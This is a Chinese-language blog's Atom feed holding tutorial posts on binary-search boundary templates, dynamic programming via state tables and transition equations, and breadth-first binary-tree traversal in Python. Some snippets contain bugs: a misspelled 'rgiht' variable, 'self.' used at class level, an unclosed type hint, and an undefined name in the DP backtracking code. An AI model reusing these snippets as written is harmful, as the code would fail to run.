<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Zer0&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://re0.top/"/>
  <updated>2020-04-29T07:54:32.741Z</updated>
  <id>http://re0.top/</id>
  
  <author>
    <name>Zer0</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>几种二分查找的模板与理解</title>
    <link href="http://re0.top/2020/04/29/binary_search/"/>
    <id>http://re0.top/2020/04/29/binary_search/</id>
    <published>2020-04-29T08:10:00.000Z</published>
    <updated>2020-04-29T07:54:32.741Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>二分查找是常见的一种搜索方式，通常用在顺序列表中查找特定的数或者区间，虽然看起来十分简单，但是在写代码的时候极容易出错，原因在于边界判断上，本质上还是对二分查找理解不到位。这篇文章整理下二分查找的模板以及谈谈自己的理解。</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="大体框架"><a href="#大体框架" class="headerlink" title="大体框架"></a>大体框架</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binarySearch</span><span class="params">(nums,target)</span>:</span></span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = ...</span><br><span class="line">    <span class="keyword">while</span> (...):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">            ...</span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &lt; target:</span><br><span class="line">            left = ...</span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &gt; target:</span><br><span class="line">            right = ...</span><br><span class="line">    <span class="keyword">return</span> ...</span><br></pre></td></tr></table></figure>   <p>二分查找的模板大致如上，其中…表示需要注意的地方。在写二分查找时尽量将所有情况都用else if的形式写出来，直观一些。<br>其次在一些语言中，使用left+right有可能会溢出，所以可以改写成<code>left + (right - left) // 2</code>。<br>基于以上模板，我们可以详细分为几类。</p><h2 id="寻找特定的一个数"><a href="#寻找特定的一个数" class="headerlink" title="寻找特定的一个数"></a>寻找特定的一个数</h2><p>这个是我们常用到的，即在数组中寻找一个特定的数，前提是这个数组已经采用升序排序。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binarySearch</span><span class="params">(nums,target)</span>:</span></span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = len(nums) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &lt; target:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &gt; target:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><br>这里需要注意的有：</p><ol><li><p>Q：为什么while的条件是<strong>left &lt;= right</strong>，而不是<strong>left &lt; right</strong>？<br>A：当条件为&lt;=时，相当于搜索的是[left,right]区间，而&lt;则相当于[left,right)的区间，当right的取值为len(nums)时，我们的nums[right]是越界的，此时右区间需要开。<br>&lt;=的终止条件为left == right + 1，此时区间为[right+1,right]，区间为空。<br>&lt; 的终止条件为left == right，即[left,left)，只有一个数的区间，但此时这个数并没有被扫描到，所以使用&lt;作为判断的话需要加入一个判断语句<code>if nums[left] == target:left else -1</code></p></li><li><p>Q：left 和 right 到底需要怎么改变？<br>A：上述代码中left=mid+1与right=mid-1是因为我们已经明确搜索区间是闭区间，即左右边界都已经搜索过，或者说mid这个索引的数已经被搜索过，所以我们需要根据需要在mid的左右区间进行搜索，即[left,mid-1]或者[mid+1,right]。</p></li></ol><h2 id="寻找左边界的二分查找"><a href="#寻找左边界的二分查找" class="headerlink" title="寻找左边界的二分查找"></a>寻找左边界的二分查找</h2><p>如果一个数组存在重复元素，并且需要你返回第一个出现这个数的索引，那么显然我们使用普通的二分查找并不能获得这个元素的在数组中出现的左边界。<br>我们先给出使用<strong>left &lt; right</strong>为条件的代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left_bound</span><span class="params">(nums,target)</span>:</span></span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = len(nums)</span><br><span class="line">    <span class="keyword">while</span> (left &lt; rgiht):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &lt; target:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &gt; target:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">return</span> left</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>这个代码是许多人常用来搜索左边界的代码，但是在结果返回时存在着一个问题。我们先整理一下问题:</p><ol><li><p>Q：如果数组中不存在这个数，那么返回不就不对了吗？<br>A：确实如此。我们刚才说到，使用&lt;为条件的搜索为右开区间，当退出循环时，此时区间为[left,left)，并且left的取值有可能为数组边界,所以我们需要两个判断语句，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if left == len(nums) or nums[left] != target:</span><br><span class="line">    return -1 </span><br><span class="line">else: </span><br><span class="line">    return left</span><br></pre></td></tr></table></figure></li><li><p>Q：为啥是left &lt; right?<br>A：理由同上，因为right被初始化为len(nums)，需要采用右开区间保证下标不越界。</p></li><li><p>Q：为什么left = mid + 1,right = mid?<br>A：因为是左闭右开区间，需要将区间分为[left,mid)与[mid+1,right)。</p></li><li><p>Q：能不能统一为left&lt;=right?<br>A：我个人认为统一left &lt;= right 比较好，前提是理解了搜索区间这个概念。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left_bound</span><span class="params">(nums,target)</span>:</span></span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = len(nums)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &lt; target:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &gt; target:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> left &gt;= len(nums) <span class="keyword">or</span> nums[left] != target:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> left</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="寻找右边界的二分查找"><a href="#寻找右边界的二分查找" class="headerlink" title="寻找右边界的二分查找"></a>寻找右边界的二分查找</h2><p>与上面代码类似，这里我只写出left&lt;=right为条件的代码。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">right_bound</span><span class="params">(nums,target)</span>:</span></span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = len(nums)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &lt; target:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &gt; target:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> right &lt; <span class="number">0</span> <span class="keyword">or</span> nums[right] != target:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> right</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>注意的点为：</p><ol><li>搜索左右边间的区别在于当nums[mid] == target时需要缩小哪个边界，当我们需要寻找<strong>左侧</strong>边界时，我们应该在搜索到target后，去搜索左侧区间；而当我们需要寻找<strong>右侧</strong>边界时，在搜索到target时，去寻找右区间。</li><li>之所以检测right是因为right的取值为[-1,len(nums)-1]，即当target比所有元素小时，right会减至-1，需要防止越界。</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我们明确搜索区间概念之后，统一将条件写为left&lt;=right，并从中总结规律。<br>先是二分查找<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binarySearch</span><span class="params">(nums,target)</span>:</span></span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = len(nums) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &lt; target:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &gt; target:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><br>其次寻找左边界<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left_bound</span><span class="params">(nums,target)</span>:</span></span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = len(nums)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &lt; target:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &gt; target:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> left &gt;= len(nums) <span class="keyword">or</span> nums[left] != target:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> left</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>最后是寻找右边界<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">right_bound</span><span class="params">(nums,target)</span>:</span></span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = len(nums)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &lt; target:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> nums[mid] &gt; target:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> right &lt; <span class="number">0</span> <span class="keyword">or</span> nums[right] != target:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> right</span><br></pre></td></tr></table></figure></p><p>寻找左右边界区别在于nums[mid] == target时需要收缩左侧边界还是右侧边界，还有因为left属于[0,len(nums)]，right属于[-1,len(nums)-1]，所以需要判断各自越界情况。<br>这些便是从升序数组中二分查找的方法。如果理解了这些，那降序数组的二分搜索也是万变不离其宗的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;二分查找是常见的一种搜索方式，通常用在顺序列表中查找特定的数或者区间，虽然看起来十分简单，但是在写代码的时候极容易出错，原因在于边界判断上，
      
    
    </summary>
    
    
      <category term="算法" scheme="http://re0.top/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="编程" scheme="http://re0.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>浅谈动态规划</title>
    <link href="http://re0.top/2020/04/05/dp1/"/>
    <id>http://re0.top/2020/04/05/dp1/</id>
    <published>2020-04-05T08:10:00.000Z</published>
    <updated>2020-04-07T07:23:13.702Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>动态规划（Dynamic programming，简称 DP），是一种通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。若要解一个给定问题，我们需要解其不同部分（即子问题），再根据子问题的解以得出原问题的解。这与递归的思想一致，所以动态规划往往用于优化递归问题，利用动态规划的思想可以减少计算量。</p><h2 id="最优子结构"><a href="#最优子结构" class="headerlink" title="最优子结构"></a>最优子结构</h2><p>最优子结构指的是，问题的最优解包含子问题的最优解。即我们可以通过子问题的最优解，推导出问题的最优解。</p><h2 id="无后效性"><a href="#无后效性" class="headerlink" title="无后效性"></a>无后效性</h2><p>无后效性有两层含义，第一层含义是，在推导后面阶段的状态的时候，我们只关心前面阶段的状态值，不关心这个状态是怎么一步一步推导出来的。第二层含义是，某阶段状态一旦确定，就不受之后阶段的决策影响。</p><h2 id="重复子问题"><a href="#重复子问题" class="headerlink" title="重复子问题"></a>重复子问题</h2><p>不同的决策序列，到达某个相同阶段时，会产生重复的状态。</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h2><p>解决动态规划问题，一般有两种思路，分别为状态转移表法和状态转移方程法。</p><h3 id="状态转移表法"><a href="#状态转移表法" class="headerlink" title="状态转移表法"></a>状态转移表法</h3><p>一般情况下，能使用动态规划解决的问题，都可以使用回溯法解决。先通过回溯法，找到是否存在重复子问题，以及相应的规律，尝试是否能使用动态规划解决。<br>找到重复子问题之后，就可以使用状态转移表来处理问题。<br>先画出一个状态表，一般来说都是二维的，可以用二维数组来表示，其中每个状态包括三个变量，行，列，数组值。根据递归关系，填充状态表的每个状态，最后翻译成代码，就是动态规划的代码了。<br>但如果问题较为复杂，状态表就有可能是高维的，这时候人在思考问题的时候就不那么简单了。<br>举个例子，要从矩阵左上角走到矩阵右下角，但是每格都有相应的权重，我们需要选择权重最小的路径。<br>这里我们可以采用回溯算法(深度优先中的一种)，回溯在遍历时不保留完整的结构，而深度优先则保留。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    self.minDist = float(<span class="string">'inf'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minDistBT</span><span class="params">(i:int,j:int,dist:int,w:list[list[int],n:int)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> i == n <span class="keyword">and</span> j == n:</span><br><span class="line">            <span class="keyword">if</span> dist &lt; minDist:</span><br><span class="line">                self.minDist = dist</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; n:</span><br><span class="line">            self.minDistBT(i + <span class="number">1</span>,j,dist + w[i][j] , w, n)</span><br><span class="line">        <span class="keyword">if</span> j &lt; n:</span><br><span class="line">            self.minDistBT(i,j + <span class="number">1</span>,dist + w[i][j] , w, n)</span><br></pre></td></tr></table></figure> </p><p>我们可以看出，一个状态即一个节点，包含三个变量(i,j,dist)，其中i,j表示行列，dist表示起点到(i,j)的路径长度，尽管(i,j,dist)没有重复值，但(i,j)重复，对于(i,j)重复的节点，我们只需要选择dist最小的节点便可以继续递归求解了。<br>我们翻译成代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minDistDP</span><span class="params">(matrix:list[list[int]],n:int)</span>:</span></span><br><span class="line">        states = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(n)] <span class="keyword">for</span> _ <span class="keyword">in</span> range(n)]</span><br><span class="line">        sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            sum += matrix[<span class="number">0</span>][i]</span><br><span class="line">            states[<span class="number">0</span>][i] = sum</span><br><span class="line">        </span><br><span class="line">        sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            sum += matrix[i][<span class="number">0</span>]</span><br><span class="line">            states[i][<span class="number">0</span>] = sum</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">                states[i][j] = matrix[i][j] + min(states[i][j<span class="number">-1</span>],states[i<span class="number">-1</span>][j])</span><br><span class="line">        <span class="keyword">return</span> states[n<span class="number">-1</span>][n<span class="number">-1</span>]</span><br></pre></td></tr></table></figure></p><p>这里我们初始化了第一行和第一列的数据，然后每一个节点都是让该节点的权重加上，上方和左方中的最小值，就是该状态表的这个节点的最小dist值。最后返回右下角节点的值，便可以获得最短路径。</p><h3 id="状态转移方程法"><a href="#状态转移方程法" class="headerlink" title="状态转移方程法"></a>状态转移方程法</h3><p>这种方法与递归的思想类似，我们需要知道，某个问题如何通过子问题求解，即寻找最优子结构，根据最优子结构写出递归公式，即状态转移方程。以上面的问题来说，状态转移方程为：<br><code>min_dist(i, j) = w[i][j] + min(min_dist(i, j-1), min_dist(i-1, j))</code><br>状态转移方程是解决动态规划的关键所在，接下来翻译成代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    self.matrix = [[random.randint(<span class="number">1</span>,<span class="number">10</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    self.n = <span class="number">4</span></span><br><span class="line">    self.mem = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    <span class="comment"># 调用minDist(n-1,n-1)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minDist</span><span class="params">(i:int,j:int)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> self.matrix[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> self.mem[i][j] &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> self.mem[i][j]</span><br><span class="line">        </span><br><span class="line">        minLetf = float(<span class="string">'inf'</span>)</span><br><span class="line">        <span class="keyword">if</span> j - <span class="number">1</span> &gt;= <span class="number">0</span>:</span><br><span class="line">            minLetf = self.minDist(i,j<span class="number">-1</span>)</span><br><span class="line">        minUp = float(<span class="string">'inf'</span>)</span><br><span class="line">        <span class="keyword">if</span> i - <span class="number">1</span> &gt;= <span class="number">0</span>:</span><br><span class="line">            minUp = self.minDist(i<span class="number">-1</span>,j)</span><br><span class="line"></span><br><span class="line">        currMinDist = self.matrix[i][j] + min(minLetf,minUp)</span><br><span class="line">        self.mem[i][j] = currMinDist</span><br><span class="line">        <span class="keyword">return</span> currMinDist</span><br></pre></td></tr></table></figure></p><p>我们从右下角回溯到左上角。每个节点的值等于该节点的权重加上上方和左方节点中的最小值。<br>其实和上面的状态转移表法的实现是差不多的，只是思考的思路不同。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>尽管动态规划比回溯算法高效，但并不是所有问题都可以使用动态规划，能使用动态规划的问题，需要满足三个条件，最优子结构，无后效性，重复子问题。在重复子问题上，动态规划与分治算法区分明显，分治算法要求分割成的子问题不能有重复子问题，而动态规划则恰恰相反，它之所以高效，是因为回溯算法中存在大量的重复子问题。<br>解决动态规划问题的思路分别是状态转移表法和状态转移方程法。其中，状态转移表法解题思路大致可以概括为<strong>回溯算法实现 - 定义状态 - 画递归树 - 找重复子问题 - 画状态转移表 - 根据递推关系填表 - 将填表过程翻译成代码。</strong>状态转移方程法的大致思路可以概括为，<strong>找最优子结构 - 写状态转移方程 - 将状态转移方程翻译成代码。</strong><br>之后的文章会通过实际问题继续探讨动态规划。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h1&gt;&lt;p&gt;动态规划（Dynamic programming，简称 DP），是一种通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。若要解一个
      
    
    </summary>
    
    
      <category term="算法" scheme="http://re0.top/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="编程" scheme="http://re0.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>二叉树的广度优先(层次)遍历</title>
    <link href="http://re0.top/2020/03/30/tree-traversal2/"/>
    <id>http://re0.top/2020/03/30/tree-traversal2/</id>
    <published>2020-03-30T09:10:00.000Z</published>
    <updated>2020-03-30T09:02:34.161Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上篇讲的是二叉树的三种遍历方式，前中后序遍历方式，它们都属于深度优先遍历，所谓深度优先就是沿着树的深度遍历树的节点。而广度优先遍历则是从root开始，从左到右从上到下水平遍历树的节点，所以又称为层次遍历。<br>深度优先借助的数据结构为栈，而广度优先借助的则是队列。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="广度优先遍历"><a href="#广度优先遍历" class="headerlink" title="广度优先遍历"></a>广度优先遍历</h2><p>由于在LeetCode中并没有找到相应的题目，所以我直接给出代码。<br>python代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">breadthTraversal</span><span class="params">(self,root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            queue = []</span><br><span class="line">            res = []</span><br><span class="line">            queue.append(root)</span><br><span class="line">            <span class="keyword">while</span> queue:</span><br><span class="line">                node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                res.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left:</span><br><span class="line">                    queue.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right:</span><br><span class="line">                    queue.append(node.right)</span><br><span class="line">            <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>二叉树的广度优先遍历较为简单，只要借助队列，让节点先进先出，便可得到层次遍历的结果。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;上篇讲的是二叉树的三种遍历方式，前中后序遍历方式，它们都属于深度优先遍历，所谓深度优先就是沿着树的深度遍历树的节点。而广度优先遍历则是从ro
      
    
    </summary>
    
    
      <category term="算法" scheme="http://re0.top/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="编程" scheme="http://re0.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>二叉树的前中后序遍历</title>
    <link href="http://re0.top/2020/03/30/tree-traversal/"/>
    <id>http://re0.top/2020/03/30/tree-traversal/</id>
    <published>2020-03-30T08:10:00.000Z</published>
    <updated>2020-03-30T09:02:35.380Z</updated>
    
